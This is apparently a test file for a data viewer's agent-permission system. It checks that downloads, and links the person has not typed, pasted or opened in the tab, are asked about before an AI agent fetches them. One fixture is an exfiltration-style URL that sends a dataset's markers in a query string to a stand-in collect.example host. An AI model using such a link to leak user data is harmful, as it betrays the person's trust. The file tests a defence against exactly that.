test('a whole-file download of a saved state\'s dataset is asked about as the agent\'s opening; declined, nothing opens', async t => {
  const p = page({ current: PANCREAS_SHOWN, saved: savedStates() });
  t.after(p.remove);
  const asked = [];
  p.dispatcher.setConfirmer(({ detail, stage }) => {
    if (stage === 'start') return true;
    asked.push(detail);
    return false;
  });
  const resource = { url: 'https://slow.example/he.h5ad', name: 'he.h5ad', size: 2_500_000_000, identity: null };
  p.onOpening = async () => {
    try {
      await wholeFileOf(resource, { opening: { step() {}, notice() {} }, signal: AbortSignal.abort() });
    } catch (error) {
      if (error?.name === 'AbortError' && error.kind === 'user') return false;
    }
    return true;
  };
  await assert.rejects(p.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT),
    error => error.code === 'declined' && error.message === 'The person declined the download, so the autosave at "Colored by gene SFTPC" was not opened.');
  assert.equal(asked.length, 1);
  assert.match(asked[0], /^It downloads the whole file he\.h5ad \(2\.3 GB\) into this browser: /);
});

// ---- a link the person has not seen in this tab is asked about first ----------------

test('an agent\'s link the person has not seen in this tab is asked about before anything is requested; declined, nothing is fetched', async t => {
  forgetSeenAddresses();
  t.after(forgetSeenAddresses);
  const p = page();
  t.after(p.remove);
  const questions = [];
  let answer = false;
  p.dispatcher.setConfirmer(question => {
    if (question.stage === 'start') return true;
    // Asked before the tab requests anything of the address.
    questions.push({ confirm: question.confirm, detail: question.detail, calls: p.calls.length });
    return answer;
  });
  const exfiltrating = 'https://collect.example/?q=the-lung-atlas-markers';
  await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: exfiltrating }, { origin: 'agent', agent: 'Claude' }),
    error => error instanceof ActionRefused && error.code === 'declined');
  assert.deepEqual(p.calls, [], 'declined: the address was never requested');
  assert.equal(questions.length, 1);
  assert.equal(questions[0].confirm, 'unseen-link');
  assert.equal(questions[0].calls, 0);
  assert.match(questions[0].detail, /^It opens .*collect\.example\/\?q=the-lung-atlas-markers.*, an address not typed, pasted or opened in this tab before\.$/);
  // An accession and a server are addresses too.
  for (const name of ['GSE999999', 'localhost:9999']) {
    await assert.rejects(p.dispatcher.dispatch('dataset.open', { name }, { origin: 'agent', agent: 'Claude' }), error => error.code === 'declined');
  }
  assert.deepEqual(p.calls, []);
  assert.equal(questions.length, 3);
  // Allowed: it opens.
  answer = true;
  await p.dispatcher.dispatch('dataset.open', { name: exfiltrating }, { origin: 'agent', agent: 'Claude' });
  assert.deepEqual(p.calls, [['address', exfiltrating]]);
});

test('a link the person typed or pasted, one open now and one of My datasets open without asking; samples and their datasets are never asked', async t => {
  forgetSeenAddresses();
  t.after(forgetSeenAddresses);
  const p = page({ current: { sourceType: 'link', id: 'url:open', name: 'Open now', identity: 'id-open', cells: 50 } });
  t.after(p.remove);
  const questions = [];
  p.dispatcher.setConfirmer(question => {
    if (question.stage !== 'start') questions.push(question.confirm);
    return true;
  });
  // Typed in the address bar (submitted), or written in the chat by the person.
  noteSeenAddress('https://typed.example/atlas.h5ad');
  noteSeenAddressesIn('Please open GSE123456, and also <https://pasted.example/data.zarr>.');
  for (const name of ['https://typed.example/atlas.h5ad', 'GSE123456', 'https://pasted.example/data.zarr', 'https://example.org/lung.h5ad', 'pancreas', 'My lung atlas']) {
    await p.dispatcher.dispatch('dataset.open', { name }, { origin: 'agent', agent: 'Claude' }).catch(() => {});
  }
  assert.deepEqual(questions, [], 'nothing the person has seen here is asked about');
  // Seen means exactly that address: another query, path or host is another address.
  for (const name of ['https://typed.example/atlas.h5ad?x=1', 'https://typed.example/other.h5ad', 'https://typed.example.evil/atlas.h5ad']) {
    await p.dispatcher.dispatch('dataset.open', { name }, { origin: 'agent', agent: 'Claude' }).catch(() => {});
  }
  assert.deepEqual(questions, ['unseen-link', 'unseen-link', 'unseen-link']);
  // The person (and a notebook, which acts for them) is never asked.
  questions.length = 0;
  await p.dispatcher.dispatch('dataset.open', { name: 'https://new.example/x.h5ad' }, { origin: 'user' }).catch(() => {});
  assert.deepEqual(questions, []);
});

test('the open dataset\'s own link is seen; spellings of one address are one', () => {
  forgetSeenAddresses();
  noteSeenAddress('  https://EXAMPLE.org:443/a.h5ad  ');
  assert.equal(isSeenAddress('https://example.org/a.h5ad'), true);
  assert.equal(isSeenAddress('https://example.org/a.h5ad#x'), false);
  noteSeenAddress('8765');
  assert.equal(isSeenAddress('localhost:8765'), true);
  assert.equal(isSeenAddress('http://localhost:8765'), true);
  assert.equal(isSeenAddress('https://shown.example/b.zarr', ['https://shown.example/b.zarr']), true);
  assert.equal(isSeenAddress('', ['']), false);
  forgetSeenAddresses();
  assert.equal(isSeenAddress('https://example.org/a.h5ad'), false);
});

test('the permission kind is asked in every preset that runs anything, refused read-only; the tool says the rule, the agent is told the setting', () => {
  const question = { meta: { origin: 'agent', agent: 'Claude' }, confirm: 'unseen-link', stage: 'handler' };
  assert.equal(decide(question, DEFAULT_PERMISSIONS).decision, 'ask');
  assert.equal(decide(question, { kinds: PERMISSION_MODES['allow-undoable'].kinds }).decision, 'ask');
  assert.equal(decide(question, { kinds: PERMISSION_MODES['read-only'].kinds }).decision, 'deny');
  assert.equal(normalizePermissions({ kinds: { change: 'allow' } }).kinds['unseen-link'], 'ask', 'settings kept before the kind existed ask');
  const document = catalogDocument(getActionCatalog());
  const opener = document.actions.find(action => action.type === 'dataset.open');
  assert.equal(opener.opensLinks, true);
  assert.deepEqual(document.actions.filter(action => action.opensLinks).map(action => action.type), ['dataset.open']);
  // The tool list never changes with the settings: its description says the rule, the agent is told the setting apart.
  const tool = mcpToolsOf(document).find(each => each.name === 'dataset_open');
  assert.match(tool.description, /A link, accession or server the person has not typed, pasted or opened in this tab is asked of them first/);
  assert.equal(tool.annotations.openWorldHint, true);
  assert.match(permissionsForAgent(normalizePermissions(null)), /opening links not seen in this tab[^:]*: are asked of the person first/);
  assert.match(permissionsForAgent(normalizePermissions({ kinds: { 'unseen-link': 'deny' } })), /opening links not seen in this tab: are refused/);
  assert.throws(() => defineAction({ ...getActionCatalog().get('datasets.list'), confirmAt: undefined, opensLinks: true }), /is a read, which fetches nothing an agent names/);
});

test('only an opensLinks action may ask about a link, and only an agent\'s is asked', async () => {
  const catalog = createActionCatalog([
    defineAction({
      type: 'thing.fetch', title: 'Fetch a thing', summary: 'Fetches a thing.', group: 'Things',
      params: { type: 'object', additionalProperties: false, properties: {} },
      reads: [], effect: 'dataset', opensLinks: true, result: { type: 'object', additionalProperties: false, properties: {} },
      describe: () => 'Fetched a thing', code: () => 'fetch_thing()',
    }),
    defineAction({
      type: 'thing.other', title: 'Other thing', summary: 'Another.', group: 'Things',
      params: { type: 'object', additionalProperties: false, properties: {} },
      reads: [], effect: 'dataset', result: { type: 'object', additionalProperties: false, properties: {} },
      describe: () => 'Other', code: () => 'other()',
    }),
  ]);
  const dispatcher = createActionDispatcher({ catalog });
  const asked = [];
  dispatcher.setConfirmer(question => { if (question.stage !== 'start') asked.push(question.meta.origin); return true; });
  dispatcher.provide('thing.fetch', async (_params, ctx) => { await ctx.confirmLink('https://x.example/'); return {}; });
  dispatcher.provide('thing.other', async (_params, ctx) => { await ctx.confirmLink('https://x.example/'); return {}; });
  await dispatcher.dispatch('thing.fetch', {}, { origin: 'agent', agent: 'Claude' });
  await dispatcher.dispatch('thing.fetch', {}, { origin: 'host', host: 'python' });
  assert.deepEqual(asked, ['agent']);
  await assert.rejects(dispatcher.dispatch('thing.other', {}, { origin: 'agent', agent: 'Claude' }), /fetches no address its parameters name \(opensLinks\)/);
});
